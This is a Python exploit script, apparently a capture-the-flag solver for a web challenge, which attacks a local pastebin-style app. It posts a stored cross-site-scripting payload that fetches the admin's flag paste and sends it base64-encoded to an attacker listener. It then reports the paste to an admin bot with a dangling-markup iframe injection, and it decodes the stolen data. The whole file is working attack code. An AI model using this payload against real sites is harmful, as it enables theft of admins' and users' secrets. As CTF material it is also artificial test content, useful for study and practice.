#!/usr/bin/env python3

import requests
import random
import string
import base64
import urllib.parse
from pwn import *

username = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
l = listen()
vuln_url = "http://localhost:1337"
local_url = f"http://localhost:{l.lport}"
session = requests.session()
r = requests.get(vuln_url)

exploit_html = """\
        <script>
            fetch("/pastes/flag").then(r=>r.text().then(t=>document.location=`{}/extract?data=${{encodeURIComponent(btoa(t))}}`))
        </script>
        """.format(local_url)

exploit_post = {
        "title": "exploit",
        "content": exploit_html
        }

dangling_markup = '?error=<iframe srcdoc="'

# register & login
user_data = {"username": "downgrade", "password": password}
session.post(vuln_url + "/register", data=user_data)
session.post(vuln_url + "/login", data=user_data)

# upload exploit
r = session.post(vuln_url + "/create", data=exploit_post, allow_redirects=False)
exploit_location = r.headers['Location']

# report to admin
session.post(vuln_url + "/report", data={"url": exploit_location + dangling_markup})

_ = l.wait_for_connection()
data_raw = l.readuntil('HTTP/1.1')
data = base64.b64decode(urllib.parse.unquote(data_raw.decode().split('data=')[1].split()[0])) # lol

if b'idek{' in data:
    exit(0)
exit(1)
